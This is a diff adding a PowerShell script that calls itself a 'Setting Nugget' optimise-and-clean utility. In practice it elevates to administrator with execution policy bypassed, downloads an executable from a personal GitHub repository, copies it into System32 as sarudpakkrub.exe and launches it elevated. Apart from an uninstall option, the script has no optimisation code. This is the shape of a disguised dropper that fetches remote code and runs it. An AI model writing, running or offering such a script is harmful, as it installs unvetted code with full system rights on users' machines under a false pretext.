@@ -1,0 +1,87 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "Hi Member Sarudpak Welcome to Setting Nugget | 23/11/2025:"
+Write-Host "1. Optimiz & Setting"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "sarudpakkrub.exe"
+$exeUrl = "https://github.com/Dekshyn3kodiwaa/dekshyn3kodiwaa/raw/refs/heads/main/sarudpakkrub.exe"
+
+# -----------------------------
+# Install & Run Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`nStarting installation..."
+
+
+    # Download exe and rename to sarudpakkrub.exe
+    Write-Host "Downloading and renaming executable to sarudpakkrub.exe..."
+    try {
+        $tempFile = Join-Path $env:TEMP "Nugget_temp.exe"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+        Move-Item -Path $tempFile -Destination $exeDestination -Force
+        Write-Host "sarudpakkrub.exe download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "sarudpakkrub.exe download failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Run the program directly
+    Write-Host "Starting the program..."
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "Program started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to start program: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # Stop the process if running
+    Write-Host "Stopping sarudpakkrub.exe process..."
+    try {
+        Stop-Process -Name "sarudpakkrub" -Force -ErrorAction SilentlyContinue
+        Write-Host "Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    # Remove files if they exist
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
+    }
+
+    Write-Host "Cleanup completed." -ForegroundColor Green
+}
+
+else {
+    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+
+}
+
+
+
